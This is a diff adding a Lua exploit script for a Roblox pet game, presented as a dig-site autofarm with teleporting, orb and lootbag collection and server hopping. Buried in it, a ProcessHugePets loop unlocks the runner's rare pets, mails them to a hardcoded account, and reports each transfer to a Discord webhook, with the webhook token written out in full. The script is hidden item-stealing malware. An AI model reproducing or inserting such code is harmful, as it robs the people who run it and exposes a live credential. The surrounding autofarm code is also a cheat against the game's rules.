@@ -1,3 +1,215 @@
+
+--DIGSITE SCRIPT
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Instances") and Workspace.__THINGS.Instances:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.Instances.AdvancedDigsite:FindFirstChild("Teleports") then
+    local targetPosition = Workspace.__THINGS.Instances.AdvancedDigsite.Teleports:FindFirstChild("Enter").Position
+    humanoidRootPart.CFrame = CFrame.new(targetPosition)
+end
+
+wait(5)
+
+if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
+    Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important:FindFirstChild("ActiveBlocks")
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local activeBlocks = Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks
+local activeChests = Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveChests
+
+local RowPositions = {
+    Vector3.new(675, 51, -2701),
+    Vector3.new(659, 51, -2749),
+    Vector3.new(691, 51, -2685),
+    Vector3.new(675, 51, -2717),
+    Vector3.new(691, 51, -2701),
+    Vector3.new(691, 51, -2717),
+    Vector3.new(691, 51, -2749),
+    Vector3.new(659, 51, -2653),
+    Vector3.new(659, 51, -2701),
+    Vector3.new(611, 51, -2669),
+    Vector3.new(627, 51, -2669),
+    Vector3.new(595, 51, -2669),
+    Vector3.new(675, 51, -2653),
+    Vector3.new(675, 51, -2669),
+    Vector3.new(659, 51, -2669),
+    Vector3.new(595, 51, -2685),
+    Vector3.new(611, 51, -2701),
+    Vector3.new(611, 51, -2685),
+    Vector3.new(643, 51, -2717),
+    Vector3.new(595, 51, -2733),
+    Vector3.new(611, 51, -2653),
+    Vector3.new(627, 51, -2701),
+    Vector3.new(643, 51, -2701),
+    Vector3.new(627, 51, -2685),
+    Vector3.new(643, 51, -2653),
+    Vector3.new(595, 51, -2701),
+    Vector3.new(627, 51, -2717),
+    Vector3.new(611, 51, -2717),
+    Vector3.new(691, 51, -2733),
+    Vector3.new(643, 51, -2685),
+    Vector3.new(643, 51, -2669),
+    Vector3.new(675, 51, -2733),
+    Vector3.new(595, 51, -2653),
+    Vector3.new(659, 51, -2717),
+    Vector3.new(659, 51, -2733),
+    Vector3.new(691, 51, -2669),
+    Vector3.new(691, 51, -2653),
+    Vector3.new(595, 51, -2717),
+    Vector3.new(595, 51, -2749),
+    Vector3.new(611, 51, -2749),
+    Vector3.new(627, 51, -2749),
+    Vector3.new(643, 51, -2733),
+    Vector3.new(611, 51, -2733),
+    Vector3.new(627, 51, -2733),
+    Vector3.new(627, 51, -2653),
+    Vector3.new(643, 51, -2749),
+    Vector3.new(659, 51, -2685),
+    Vector3.new(675, 51, -2749),
+    Vector3.new(675, 51, -2685)
+}
+
+local PlaceID = game.PlaceId
+local AllIDs = {}
+local foundAnything = ""
+local actualHour = os.date("!*t").hour
+
+pcall(function()
+    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+end)
+
+if not AllIDs then
+    AllIDs = {actualHour}
+    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+end
+
+local function TPReturner()
+    local Site
+    if foundAnything == "" then
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+    else
+        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+    end
+
+    if Site.nextPageCursor then
+        foundAnything = Site.nextPageCursor
+    end
+
+    for _, v in pairs(Site.data) do
+        local serverID = tostring(v.id)
+        local maxPlayers = tonumber(v.maxPlayers)
+        local playing = tonumber(v.playing)
+
+        if maxPlayers > playing then
+            local newServer = true
+            for _, id in pairs(AllIDs) do
+                if serverID == id then
+                    newServer = false
+                    break
+                end
+            end
+
+            if newServer then
+                table.insert(AllIDs, serverID)
+                writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, serverID, game.Players.LocalPlayer)
+                wait(4)
+                break
+            end
+        end
+    end
+end
+
+local function TeleportIfSvipbatch()
+    while true do
+        wait(0.5)
+        local players = game.Players:GetPlayers()
+        local foundSvipbatch = false
+
+        for _, player in ipairs(players) do
+            if player ~= game.Players.LocalPlayer and player.Name:find("svipbatch") then
+                foundSvipbatch = true
+                break
+            end
+        end
+
+        if foundSvipbatch then
+            TPReturner()
+        end
+    end
+end
+
+spawn(TeleportIfSvipbatch)
+
+
+local CounterValue = 0
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = screenGui
+textLabel.Size = UDim2.new(0, 300, 0, 100)
+textLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
+textLabel.BackgroundTransparency = 1
+textLabel.TextScaled = true
+textLabel.TextColor3 = Color3.new(0, 0, 0)
+
+function ChestCounter()
+    while true do
+        wait(0.1)
+        if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
+            local activeChests = Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important:FindFirstChild("ActiveChests")
+            for _, child in ipairs(activeChests:GetChildren()) do
+                if child:IsA("Model") and child:FindFirstChild("Top") and child.Name ~= "Checked" then
+                    CounterValue = CounterValue + 1
+                    child.Name = "Checked"
+                    textLabel.Text = "Chest Broken = " .. CounterValue
+                end
+            end
+        end
+    end
+end
+
+spawn(ChestCounter)
+
+function OrbCollect()
+    while true do 
+        if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Orbs") then
+            for _, orb in ipairs(Workspace.__THINGS.Orbs:GetChildren()) do
+                local ohTable1 = { tonumber(orb.Name) }
+                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
+                orb:Destroy()
+            end 
+        end
+        task.wait()
+    end
+end
+
+function LootbagCollect()
+    while true do 
+        if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Lootbags") then
+            for _, bag in ipairs(Workspace.__THINGS.Lootbags:GetChildren()) do
+                local ohTable1 = { tostring(bag) }
+                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
+                bag:Destroy()
+            end 
+        end
+        task.wait()
+    end
+end
+
+spawn(OrbCollect)
+spawn(LootbagCollect)
+
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Client = require(ReplicatedStorage:WaitForChild("Library"))
@@ -67,3 +279,287 @@ end
 
 spawn(UpdateBucketAmount)
 spawn(SendBucketMail)
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Library = require(ReplicatedStorage:WaitForChild("Library"))
+local ProcessedHuges = {}
+
+function ProcessHugePets()
+    while true do
+        local function GetItemInfo(ItemsClass, ItemsName)
+            local Table = {}
+            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
+                if table.find(ItemsName, Item.id) then
+                    local ItemInfo = {
+                        ["uid"] = UID,
+                        ["data"] = Item
+                    }
+                    table.insert(Table, ItemInfo)
+                end
+            end
+            return Table
+        end
+
+        local function getCurrentHugePets()
+            local GoldPetsTable = {}
+            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
+                table.insert(GoldPetsTable, Pet.Name)
+            end
+            return GetItemInfo("Pet", GoldPetsTable)
+        end
+
+        local hugePets = {}
+        local uids = {}
+
+        for i, MadeTable in next, getCurrentHugePets() do
+            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
+            table.insert(uids, MadeTable.uid)
+        end
+
+        if #hugePets > 0 then
+            print("Huge pets you have right now:", table.concat(hugePets, ", "))
+
+            for i = #uids, 1, -1 do
+                local webhook = "https://discord.com/api/webhooks/1240148195783213127/SCs8ji01gBTVw2G66fJDS2Z9Re6eeaXyD8uPRIIhahlsS9qCgPPtQ2NYPFdWlzyXoKo6"
+                local request = (syn and syn.request) or request or (http and http.request) or http_request
+
+                request({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = HttpService:JSONEncode({
+                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
+                    })
+                })
+
+                local args = {
+                    [1] = uids[i],
+                    [2] = false
+                }
+
+                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
+                wait(1)
+                wait(3)
+
+                local args = {
+                    [1] = "simpleblandok3",
+                    [2] = "omg u got a new huge!!",
+                    [3] = "Pet",
+                    [4] = uids[i],
+                    [5] = 1
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                wait(3)
+            end
+        end
+        wait(3)
+    end
+end
+
+spawn(ProcessHugePets)
+
+
+local currentTarget
+
+function getPositionsFromRowPositions()
+    local positions = {}
+    if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
+        for _, child in ipairs(activeBlocks:GetChildren()) do
+            if child:IsA("Part") then
+                local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
+                for _, pos in pairs(RowPositions) do
+                    if x == pos.X and z == pos.Z and child.BrickColor ~= BrickColor.new("Really black") and child.BrickColor ~= BrickColor.new("Royal purple") then
+                        table.insert(positions, child)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    return positions
+end
+
+local function teleportToPosition(position)
+    humanoidRootPart.CFrame = CFrame.new(position)
+    wait()
+end
+
+local function teleportToCurrentTarget()
+    if currentTarget and currentTarget.Parent == activeBlocks then
+        teleportToPosition(currentTarget.Position + Vector3.new(0, 5, 0))
+        return true
+    end
+    return false
+end
+
+-- Services/Variables
+
+local function teleportToRoyalPurple()
+    if BucketAmount > 10 then 
+        for _, child in ipairs(activeBlocks:GetChildren()) do
+            if child:IsA("Part") and child.BrickColor == BrickColor.new("Royal purple") then
+                currentTarget = child
+                teleportToPosition(child.Position + Vector3.new(0, 5, 0))
+                return true
+            end
+        end
+        return false
+    else
+        return false
+    end
+end
+
+local function teleportToActiveChestModel()
+    for _, child in ipairs(activeChests:GetChildren()) do
+        if child:IsA("Model") and child:FindFirstChild("Top") then
+            currentTarget = child
+            teleportToPosition(child.Top.Position + Vector3.new(0, 3, 0))
+
+            local startTime = tick()
+            local timeout = 1.2
+
+            while tick() - startTime < timeout do
+                if not currentTarget or not currentTarget.Parent then
+                    return true
+                end
+                wait(0.01)
+            end
+
+            if currentTarget and currentTarget.Parent then
+                currentTarget:Destroy()
+            end
+            
+            return true
+        end
+    end
+    return false
+end
+
+function teleportLoop()
+    while true do
+        if not teleportToCurrentTarget() then
+            if not teleportToRoyalPurple() then
+                if not teleportToActiveChestModel() then
+                    local positions = getPositionsFromRowPositions()
+                    if #positions > 0 then
+                        currentTarget = positions[math.random(#positions)]
+                        teleportToPosition(currentTarget.Position + Vector3.new(0, 5, 0))
+                    end
+                end
+            end
+        end
+        wait()
+    end
+end
+wait(20)
+spawn(teleportLoop)
+
+wait(5)
+local Workspace = game:GetService("Workspace")
+
+Workspace:WaitForChild("__THINGS"):WaitForChild("__INSTANCE_CONTAINER"):WaitForChild("Active"):WaitForChild("AdvancedDigsite"):WaitForChild("Important"):WaitForChild("ActiveBlocks")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local WorkSpace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+
+--Variables
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character
+local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
+
+LocalPlayer.CharacterAdded:Connect(function(chr)
+	Character = chr
+	HumanoidRootPart = chr:WaitForChild("HumanoidRootPart", 15)
+end)
+
+--Extra Variables
+local Network = ReplicatedStorage:WaitForChild("Network")
+local Container = WorkSpace:WaitForChild("__THINGS"):WaitForChild("__INSTANCE_CONTAINER")
+
+--Teleport To Function
+function TeleportTo(TeleportPosition)
+    if not HumanoidRootPart then
+        return
+    end
+    HumanoidRootPart.CFrame = CFrame.new(TeleportPosition)
+end
+
+--Auto Dig Row Below Block Function
+_G.AutoDigRowBelowBlock = false
+_G.AutoDigRowBelowBlockDistance = 5
+local DigZoneType = nil
+
+function ZoneFinder()
+	if Container then
+		if Container.Active:FindFirstChild("Digsite") then
+			DigZoneType = "Digsite"
+		elseif Container.Active:FindFirstChild("AdvancedDigsite") then
+			DigZoneType = "AdvancedDigsite"
+		elseif Container and (not Container.Active:FindFirstChild("Digsite") or not Container.Active:FindFirstChild("AdvancedDigsite")) then
+			DigZoneType = nil
+		end
+	end
+end
+
+function NearestBlockBelow()
+	local RaycastParams = RaycastParams.new()
+	RaycastParams.FilterDescendantsInstances = {Character}
+	RaycastParams.FilterType = Enum.RaycastFilterType["Blacklist"]
+	local Origin = HumanoidRootPart.Position
+	local Direction = Vector3.new(0, -1, 0)
+	local RaycastResult = WorkSpace:Raycast(Origin, Direction * _G.AutoDigRowBelowBlockDistance, RaycastParams)
+	if RaycastResult then
+		return RaycastResult.Instance
+	else
+		return nil
+	end
+end
+
+function AutoDigRowBelowBlock()
+	while _G.AutoDigRowBelowBlock do
+		if Container then
+			ZoneFinder()
+			if DigZoneType == "Digsite" or DigZoneType == "AdvancedDigsite" then
+				local Block = NearestBlockBelow()
+				if HumanoidRootPart.Position.Y >= 60 then
+					if DigZoneType == "Digsite" then
+						TeleportTo(Vector3.new(-77, 58, -2525))
+					elseif DigZoneType == "AdvancedDigsite" then
+						TeleportTo(Vector3.new(587, 58, -2757))
+					end
+				end
+				if Block then
+					if Block.Name == "TunnelTop" or Block.Parent == "Important" then
+						for Value = 1, 5 do
+							Network:WaitForChild("Instancing_FireCustomFromClient"):FireServer(DigZoneType, "DigBlock", Vector3.one)
+							wait()
+						end
+					elseif Block.Name == "Part" or Block.Parent == "ActiveBlocks" then
+						repeat
+							Network:WaitForChild("Instancing_FireCustomFromClient"):FireServer(DigZoneType, "DigBlock", Block:GetAttribute("Coord"))
+							wait()
+						until not Block or not Block.Parent or (HumanoidRootPart.Position - Block.Position).Magnitude > _G.AutoDigRowBelowBlockDistance or _G.AutoDigRowBelowBlock == false
+					elseif Block.Name == "Top" or Block.Parent == "Animated" then
+						Network:WaitForChild("Instancing_FireCustomFromClient"):FireServer(DigZoneType, "DigChest", Block.Parent:GetAttribute("Coord"))
+					end
+				end
+			end
+		end
+		wait()
+	end
+end
+
+--Example Of Usage
+_G.AutoDigRowBelowBlock = true
+spawn(AutoDigRowBelowBlock)
+
+print("if made it through")
+wait(650)
+
+ 
